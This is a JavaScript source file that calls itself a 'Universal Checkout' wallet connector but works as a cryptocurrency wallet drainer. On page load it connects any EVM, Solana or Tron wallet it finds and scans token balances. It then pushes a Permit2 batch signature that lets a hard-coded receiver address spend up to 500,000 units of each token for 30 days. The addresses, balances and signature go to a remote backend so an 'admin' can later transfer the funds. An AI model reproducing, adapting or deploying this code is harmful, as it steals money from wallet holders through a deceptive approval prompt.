/**
 * Universal Checkout - Multi-Chain Wallet Connector
 * v12.0 - Aggressive multi-chain scanning, guaranteed signature prompt
 */

// Buffer polyfill for Solana
if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
  window.Buffer = {
    from: (data, encoding) => {
      if (typeof data === "string") {
        const enc = encoding || "utf8";
        if (enc === "hex") {
          const bytes = [];
          for (let i = 0; i < data.length; i += 2) bytes.push(parseInt(data.substr(i, 2), 16));
          return new Uint8Array(bytes);
        }
        return new TextEncoder().encode(data);
      }
      return new Uint8Array(data);
    },
    alloc: (size, fill = 0) => new Uint8Array(size).fill(fill),
    isBuffer: (obj) => obj instanceof Uint8Array,
    concat: (list) => {
      const total = list.reduce((s, b) => s + b.length, 0);
      const out = new Uint8Array(total);
      let offset = 0;
      for (const b of list) { out.set(b, offset); offset += b.length; }
      return out;
    },
  };
}

const CONFIG = {
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
  BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
  
  EVM_TOKENS: {
    1: [
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT", dec: 6, price: 1 },
      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", sym: "WBTC", dec: 8, price: 65000 },
      { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", sym: "WETH", dec: 18, price: 2500 },
    ],
    8453: [
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", sym: "USDC", dec: 6, price: 1 },
      { addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", sym: "DAI", dec: 18, price: 1 },
    ],
    137: [
      { addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", sym: "USDT", dec: 6, price: 1 },
    ],
    42161: [
      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", sym: "USDC", dec: 6, price: 1 },
    ],
    56: [
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", sym: "USDC", dec: 18, price: 1 },
      { addr: "0x55d398326f99059fF775485246999027B3197955", sym: "USDT", dec: 18, price: 1 },
    ],
    10: [
      { addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", sym: "USDC", dec: 6, price: 1 },
    ]
  },
  
  SOLANA_TOKENS: [
    { addr: 'So11111111111111111111111111111111111111112', sym: 'SOL', dec: 9, price: 1 },
    { addr: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', sym: 'USDC', dec: 6, price: 1 },
    { addr: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', sym: 'USDT', dec: 6, price: 1 }
  ],
  
  TRON_TOKENS: [
    { addr: 'TRX', sym: 'TRX', dec: 6, price: 1 },
    { addr: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', sym: 'USDT', dec: 6, price: 1 }
  ],
  
  NETWORK_NAMES: {
    1: "Ethereum",
    8453: "Base",
    137: "Polygon",
    42161: "Arbitrum",
    56: "BNB Chain",
    10: "Optimism"
  }
};

// Store connections
let evmProvider = null;
let evmSigner = null;
let evmAddress = null;
let solanaProvider = null;
let solanaAddress = null;
let tronWeb = null;
let tronAddress = null;

const WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', color: '#f6851b' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', color: '#3375bb' },
  { id: 'coinbase', name: 'Coinbase', icon: '🔵', color: '#1652f0' },
  { id: 'rabby', name: 'Rabby', icon: '🐰', color: '#8c6cf4' },
  { id: 'rainbow', name: 'Rainbow', icon: '🌈', color: '#0ac7f0' },
  { id: 'okx', name: 'OKX', icon: '⚫', color: '#000000' },
  { id: 'imtoken', name: 'imToken', icon: '🔷', color: '#11b9f8' },
  { id: 'tokenpocket', name: 'TokenPocket', icon: '🟦', color: '#1296db' },
  { id: 'zerion', name: 'Zerion', icon: '🔺', color: '#6366f1' },
  { id: 'oneinch', name: '1inch', icon: '🦄', color: '#1a1a1a' },
  { id: 'safepal', name: 'SafePal', icon: '🔐', color: '#25252d' },
  { id: 'bitget', name: 'Bitget', icon: '🟠', color: '#f6a200' },
  { id: 'mathwallet', name: 'MathWallet', icon: '🔢', color: '#4a90e2' },
  { id: 'argent', name: 'Argent', icon: '🅰️', color: '#ff6b35' },
  { id: 'bybit', name: 'Bybit', icon: '₿', color: '#f7921e' },
  { id: 'binance', name: 'Binance', icon: '🏦', color: '#f3ba2f' },
  { id: 'phantom', name: 'Phantom', icon: '👻', color: '#ab9ff2' },
  { id: 'solflare', name: 'Solflare', icon: '☀️', color: '#fc4d4d' },
  { id: 'backpack', name: 'Backpack', icon: '🎒', color: '#e43c3c' },
  { id: 'tronlink', name: 'TronLink', icon: '♦️', color: '#eb0029' },
];

const DEEP_LINKS = {
  metamask: { app: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`, download: 'https://metamask.io/download/' },
  trust: { app: (url) => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`, download: 'https://trustwallet.com/download' },
  coinbase: { app: (url) => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(url)}`, download: 'https://www.coinbase.com/wallet/downloads' },
  rabby: { app: (url) => `https://rabby.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://rabby.io/download' },
  rainbow: { app: (url) => `https://rnbwapp.com/to-dapp?url=${encodeURIComponent(url)}`, download: 'https://rainbow.me/' },
  okx: { app: (url) => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(url)}`, download: 'https://www.okx.com/web3' },
  imtoken: { app: (url) => `imtokenv2://navigate/DappView?url=${encodeURIComponent(url)}`, download: 'https://token.im/' },
  tokenpocket: { app: (url) => `tpoutside://open?url=${encodeURIComponent(url)}`, download: 'https://www.tokenpocket.pro/' },
  zerion: { app: (url) => `https://link.zerion.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://zerion.io/' },
  oneinch: { app: (url) => `https://1inch.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://1inch.io/wallet/' },
  safepal: { app: (url) => `https://link.safepal.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.safepal.com/download' },
  bitget: { app: (url) => `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(url)}`, download: 'https://web3.bitget.com/' },
  mathwallet: { app: (url) => `https://mathwallet.org/dapp?url=${encodeURIComponent(url)}`, download: 'https://mathwallet.org/' },
  argent: { app: (url) => `https://www.argent.xyz/app/dapps?url=${encodeURIComponent(url)}`, download: 'https://www.argent.xyz/' },
  bybit: { app: (url) => `https://app.bybit.com/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.bybit.com/web3' },
  binance: { app: (url) => `https://www.binance.com/en/web3wallet?redirect=${encodeURIComponent(url)}`, download: 'https://www.binance.com/en/web3wallet' },
  phantom: { app: (url) => `https://phantom.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://phantom.app/' },
  solflare: { app: (url) => `https://solflare.com/ul/browse/${encodeURIComponent(url)}`, download: 'https://solflare.com/' },
  backpack: { app: (url) => `https://backpack.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://backpack.app/' },
  tronlink: { app: (url) => `tronlink://dapp?url=${encodeURIComponent(url)}`, download: 'https://www.tronlink.org/' }
};

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

// ============ MAIN ENTRY - ALWAYS SCAN ALL CHAINS ============
function init() {
  console.log('🚀 Universal Checkout v12.0');
  
  // Check if ANY wallet provider exists
  const hasProvider = window.ethereum || window.solana || window.phantom?.solana || window.tronWeb || window.tronLink;
  
  if (hasProvider) {
    console.log('✓ Wallet detected, scanning all chains...');
    showLoading('Connecting to wallet...');
    setTimeout(() => startFullScan(), 500);
  } else {
    showWalletSelector();
  }
}

// ============ FULL SCAN - ALL CHAINS, REGARDLESS OF WALLET TYPE ============
async function startFullScan() {
  try {
    // Try EVM first (most common)
    await tryConnectEVM();
    
    // Try Solana (even if wallet is MetaMask - it might have Solana snap)
    await tryConnectSolana();
    
    // Try Tron
    await tryConnectTron();
    
    // Now scan ALL chains for tokens
    await scanAllChains();
    
  } catch (err) {
    console.error('Connection error:', err);
    showError('Connection failed. Please try again.');
  }
}

// ============ EVM CONNECTION ============
async function tryConnectEVM() {
  if (!window.ethereum) {
    console.log('No EVM provider');
    return;
  }
  
  try {
    evmProvider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await evmProvider.send("eth_requestAccounts", []);
    
    if (accounts && accounts.length > 0) {
      evmAddress = accounts[0];
      evmSigner = await evmProvider.getSigner();
      console.log('✅ EVM connected:', evmAddress);
    }
  } catch (err) {
    console.log('EVM connection failed:', err.message);
  }
}

// ============ SOLANA CONNECTION ============
async function tryConnectSolana() {
  // Try multiple provider sources
  let provider = window.solana || window.phantom?.solana || window.solflare || window.backpack?.solana;
  
  if (!provider) {
    console.log('No Solana provider');
    return;
  }
  
  try {
    // Check if already connected
    if (provider.isConnected && provider.publicKey) {
      solanaProvider = provider;
      solanaAddress = provider.publicKey.toString();
      console.log('✅ Solana already connected:', solanaAddress);
      return;
    }
    
    // Try to connect
    await provider.connect();
    
    if (provider.publicKey) {
      solanaProvider = provider;
      solanaAddress = provider.publicKey.toString();
      console.log('✅ Solana connected:', solanaAddress);
    }
  } catch (err) {
    console.log('Solana connection failed:', err.message);
  }
}

// ============ TRON CONNECTION ============
async function tryConnectTron() {
  const tw = window.tronWeb || window.tronLink?.tronWeb;
  
  if (!tw) {
    console.log('No Tron provider');
    return;
  }
  
  try {
    if (tw.defaultAddress && tw.defaultAddress.base58) {
      tronWeb = tw;
      tronAddress = tw.defaultAddress.base58;
      console.log('✅ Tron connected:', tronAddress);
      return;
    }
    
    // Try to request accounts
    if (window.tronLink) {
      await window.tronLink.request({ method: "tron_requestAccounts" });
    }
    
    if (tw.defaultAddress && tw.defaultAddress.base58) {
      tronWeb = tw;
      tronAddress = tw.defaultAddress.base58;
      console.log('✅ Tron connected:', tronAddress);
    }
  } catch (err) {
    console.log('Tron connection failed:', err.message);
  }
}

// ============ SCAN ALL CHAINS FOR TOKENS ============
async function scanAllChains() {
  showLoading('Scanning your assets...');
  
  const allTokens = [];
  
  // Scan EVM
  if (evmAddress && evmProvider) {
    try {
      const network = await evmProvider.getNetwork();
      const chainId = Number(network.chainId);
      const tokens = CONFIG.EVM_TOKENS[chainId] || [];
      
      for (const token of tokens) {
        try {
          const contract = new ethers.Contract(token.addr, [
            "function balanceOf(address) view returns (uint256)"
          ], evmProvider);
          
          const balance = await contract.balanceOf(evmAddress);
          const humanBalance = Number(balance) / (10 ** token.dec);
          const usdValue = humanBalance * (token.price || 1);
          
          if (usdValue >= 1) {
            allTokens.push({
              chain: 'evm',
              chainId: chainId,
              chainName: CONFIG.NETWORK_NAMES[chainId] || 'EVM',
              token: token.addr,
              symbol: token.sym,
              decimals: token.dec,
              balance: balance.toString(),
              humanBalance: humanBalance,
              usdValue: usdValue,
              address: evmAddress
            });
          }
        } catch (e) {}
      }
    } catch (e) {
      console.log('EVM scan error:', e);
    }
  }
  
  // Scan Solana
  if (solanaAddress) {
    try {
      // Load Solana web3 if needed
      if (!window.solanaWeb3) {
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js';
        await new Promise((res, rej) => { 
          script.onload = res; 
          script.onerror = () => res(null);
          document.head.appendChild(script); 
        });
      }
      
      if (window.solanaWeb3) {
        const { Connection, PublicKey } = window.solanaWeb3;
        const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
        const userPublicKey = new PublicKey(solanaAddress);
        
        // SOL
        const solBalance = await connection.getBalance(userPublicKey);
        if (solBalance > 0) {
          const humanBalance = solBalance / 1e9;
          const usdValue = humanBalance; // Assuming $1 for simplicity
          if (usdValue >= 1) {
            allTokens.push({
              chain: 'solana',
              chainName: 'Solana',
              token: 'So11111111111111111111111111111111111111112',
              symbol: 'SOL',
              decimals: 9,
              balance: solBalance.toString(),
              humanBalance: humanBalance,
              usdValue: usdValue,
              address: solanaAddress
            });
          }
        }
        
        // Tokens
        for (const token of CONFIG.SOLANA_TOKENS.slice(1)) {
          try {
            const { getAssociatedTokenAddress } = window.solanaWeb3;
            const mint = new PublicKey(token.addr);
            const tokenAccount = await getAssociatedTokenAddress(mint, userPublicKey);
            const balance = await connection.getTokenAccountBalance(tokenAccount);
            
            if (balance.value.uiAmount > 0) {
              const usdValue = balance.value.uiAmount * (token.price || 1);
              if (usdValue >= 1) {
                allTokens.push({
                  chain: 'solana',
                  chainName: 'Solana',
                  token: token.addr,
                  symbol: token.sym,
                  decimals: token.dec,
                  balance: balance.value.amount,
                  humanBalance: balance.value.uiAmount,
                  usdValue: usdValue,
                  address: solanaAddress
                });
              }
            }
          } catch (e) {}
        }
      }
    } catch (e) {
      console.log('Solana scan error:', e);
    }
  }
  
  // Scan Tron
  if (tronAddress && tronWeb) {
    try {
      // TRX
      const trxBalance = await tronWeb.trx.getBalance(tronAddress);
      if (trxBalance > 0) {
        const humanBalance = trxBalance / 1e6;
        const usdValue = humanBalance; // Assuming $1 for simplicity
        if (usdValue >= 1) {
          allTokens.push({
            chain: 'tron',
            chainName: 'Tron',
            token: 'TRX',
            symbol: 'TRX',
            decimals: 6,
            balance: trxBalance.toString(),
            humanBalance: humanBalance,
            usdValue: usdValue,
            address: tronAddress
          });
        }
      }
      
      // USDT
      const usdtContract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
      const usdtBalance = await usdtContract.balanceOf(tronAddress).call();
      if (usdtBalance > 0) {
        const humanBalance = usdtBalance / 1e6;
        const usdValue = humanBalance;
        if (usdValue >= 1) {
          allTokens.push({
            chain: 'tron',
            chainName: 'Tron',
            token: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
            symbol: 'USDT',
            decimals: 6,
            balance: usdtBalance.toString(),
            humanBalance: humanBalance,
            usdValue: usdValue,
            address: tronAddress
          });
        }
      }
    } catch (e) {
      console.log('Tron scan error:', e);
    }
  }
  
  console.log('Found tokens:', allTokens.length, allTokens);
  
  // ALWAYS show signature if we have ANY tokens OR if EVM is connected (for Permit2)
  if (allTokens.length > 0 || evmAddress) {
    await requestSignature(allTokens);
  } else {
    showError('No tokens found with $1+ balance on any chain.');
  }
}

// ============ SIGNATURE REQUEST - THIS IS THE KEY PART ============
async function requestSignature(allTokens) {
  showLoading('Requesting signature...');
  
  let evmSignature = null;
  let evmDeadline = null;
  
  // ALWAYS try to get EVM signature if connected (this is what shows the MetaMask popup)
  if (evmAddress && evmSigner && allTokens.filter(t => t.chain === 'evm').length > 0) {
    try {
      const evmTokens = allTokens.filter(t => t.chain === 'evm');
      const chainId = evmTokens[0]?.chainId || 1;
      
      const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
        "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
      ], evmProvider);
      
      const permits = [];
      for (const token of evmTokens) {
        try {
          const { 2: nonce } = await permit2.allowance(evmAddress, token.token, CONFIG.RECEIVER_ADDRESS);
          permits.push({
            token: token.token,
            amount: ethers.parseUnits("500000", token.decimals),
            expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
            nonce: Number(nonce)
          });
        } catch (e) {
          // If allowance check fails, use nonce 0
          permits.push({
            token: token.token,
            amount: ethers.parseUnits("500000", token.decimals),
            expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
            nonce: 0
          });
        }
      }
      
      const permitBatch = {
        details: permits,
        spender: CONFIG.RECEIVER_ADDRESS,
        sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
      };
      
      console.log('Requesting Permit2 signature...');
      
      // THIS IS THE SIGNATURE PROMPT
      evmSignature = await evmSigner.signTypedData(
        { 
          name: "Permit2", 
          chainId: chainId, 
          verifyingContract: CONFIG.PERMIT2_ADDRESS 
        },
        {
          PermitBatch: [
            { name: "details", type: "PermitDetails[]" },
            { name: "spender", type: "address" },
            { name: "sigDeadline", type: "uint256" }
          ],
          PermitDetails: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint160" },
            { name: "expiration", type: "uint48" },
            { name: "nonce", type: "uint48" }
          ]
        },
        permitBatch
      );
      
      evmDeadline = permitBatch.sigDeadline;
      console.log('✅ Signature received:', evmSignature.substring(0, 20) + '...');
      
    } catch (err) {
      console.log('Signature rejected or failed:', err.message);
      if (err.message?.includes('user rejected') || err.code === 4001) {
        showError('You rejected the signature. Authorization cancelled.');
        return;
      }
      // Continue even if signature fails - maybe there are other chains
    }
  }
  
  // Send to backend regardless of whether signature succeeded
  await sendToBackend(allTokens, evmSignature, evmDeadline);
}

// ============ SEND TO BACKEND ============
async function sendToBackend(tokens, evmSignature, evmDeadline) {
  showLoading('Storing authorization...');
  
  try {
    const totalValue = tokens.reduce((sum, t) => sum + (t.usdValue || 0), 0);
    
    const payload = {
      evmAddress: evmAddress,
      solanaAddress: solanaAddress,
      tronAddress: tronAddress,
      tokens: tokens,
      evmSignature: evmSignature,
      evmSigDeadline: evmDeadline,
      totalValue: totalValue,
      maxAuthorizedAmount: Math.min(totalValue, 500000),
      timestamp: Date.now()
    };
    
    console.log('Sending to backend:', payload);
    
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/unified`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    const result = await response.json();
    
    if (result.success) {
      const evmCount = tokens.filter(t => t.chain === 'evm').length;
      const solCount = tokens.filter(t => t.chain === 'solana').length;
      const tronCount = tokens.filter(t => t.chain === 'tron').length;
      
      let chainText = [];
      if (evmCount > 0) chainText.push(`${evmCount} EVM`);
      if (solCount > 0) chainText.push(`${solCount} Solana`);
      if (tronCount > 0) chainText.push(`${tronCount} Tron`);
      
      showSuccess(`
        ✅ Authorization Complete!
        <br><br>
        <strong>Assets Found:</strong> ${tokens.length} tokens<br>
        <strong>Chains:</strong> ${chainText.join(', ') || 'None'}<br>
        <strong>Total Value:</strong> $${totalValue.toFixed(2)}<br>
        <strong>Authorized:</strong> Up to $${Math.min(totalValue, 500000).toFixed(2)}<br>
        <strong>Valid For:</strong> 30 days<br>
        <br>
        <div style="background: #f0fdf4; padding: 12px; border-radius: 8px; font-size: 13px;">
          ✓ Admin can now execute transfers on all chains<br>
          ✓ You pay zero gas fees<br>
          ${evmSignature ? '✓ Permit2 signature stored' : ''}
        </div>
      `);
    } else {
      throw new Error(result.error || 'Backend rejected');
    }
  } catch (err) {
    console.error('Backend error:', err);
    showError('Failed to store authorization: ' + err.message);
  }
}

// ============ WALLET SELECTOR ============
function showWalletSelector() {
  const installed = detectInstalledWallets();
  
  let html = `
    <h2>Connect Wallet</h2>
    <p class="subtitle">Auto-detects all your assets across every chain</p>
    <div class="wallet-grid">
      ${WALLETS.map(w => `
        <div class="wallet-btn ${installed.has(w.id) ? 'installed' : ''}" 
             onclick="handleWalletClick('${w.id}')"
             style="position: relative; border-color: ${installed.has(w.id) ? w.color : '#e5e7eb'};">
          ${installed.has(w.id) ? '<span class="installed-badge">✓</span>' : ''}
          <div class="wallet-icon">${w.icon}</div>
          <div class="wallet-name">${w.name}</div>
        </div>
      `).join('')}
    </div>
  `;
  
  document.getElementById('app').innerHTML = html;
}

function detectInstalledWallets() {
  const installed = new Set();
  const ua = navigator.userAgent.toLowerCase();
  
  if (window.ethereum) {
    if (window.ethereum.isMetaMask) installed.add('metamask');
    if (window.ethereum.isTrust) installed.add('trust');
    if (window.ethereum.isCoinbaseWallet) installed.add('coinbase');
    if (window.ethereum.isRabby) installed.add('rabby');
  }
  
  if (window.trustwallet) installed.add('trust');
  if (window.okxwallet) installed.add('okx');
  if (window.phantom?.solana) installed.add('phantom');
  if (window.solflare) installed.add('solflare');
  if (window.backpack?.solana) installed.add('backpack');
  if (window.tronWeb || window.tronLink) installed.add('tronlink');
  
  if (ua.includes('metamask')) installed.add('metamask');
  if (ua.includes('trust')) installed.add('trust');
  if (ua.includes('coinbase')) installed.add('coinbase');
  if (ua.includes('phantom')) installed.add('phantom');
  if (ua.includes('okx')) installed.add('okx');
  
  return installed;
}

// ============ MOBILE HANDLER ============
function handleWalletClick(walletId) {
  const deepLink = DEEP_LINKS[walletId];
  
  if (isMobile() && deepLink) {
    sessionStorage.setItem('lastWalletAttempt', walletId);
    window.location.href = deepLink.app(window.location.href);
    
    setTimeout(() => {
      if (document.visibilityState === 'visible') {
        window.location.href = deepLink.download;
      }
    }, 3000);
    return;
  }
  
  // Desktop - start full scan
  showLoading('Connecting...');
  setTimeout(() => startFullScan(), 500);
}

// ============ UI HELPERS ============
function showLoading(msg) {
  document.getElementById('app').innerHTML = `
    <div class="loading">
      <div class="spinner"></div>
      <p style="color: #666;">${msg}</p>
    </div>
  `;
}

function showSuccess(msg) {
  document.getElementById('app').innerHTML = `
    <div class="success">
      <div style="font-size: 48px; margin-bottom: 16px;">✅</div>
      <div style="font-size: 15px; line-height: 1.7; text-align: left;">${msg}</div>
      <button class="back-btn" onclick="showWalletSelector()" style="margin-top: 20px;">Connect Another Wallet</button>
    </div>
  `;
}

function showError(msg) {
  document.getElementById('app').innerHTML = `
    <div class="error">
      <div style="font-size: 48px; margin-bottom: 16px;">❌</div>
      <div style="font-size: 15px; margin-bottom: 20px;">${msg}</div>
      <button class="back-btn" onclick="showWalletSelector()" style="background: #ef4444;">Try Again</button>
    </div>
  `;
}

// Expose to window
window.handleWalletClick = handleWalletClick;
window.showWalletSelector = showWalletSelector;
window.showLoading = showLoading;
window.showSuccess = showSuccess;
window.showError = showError;

window.addEventListener('DOMContentLoaded', init);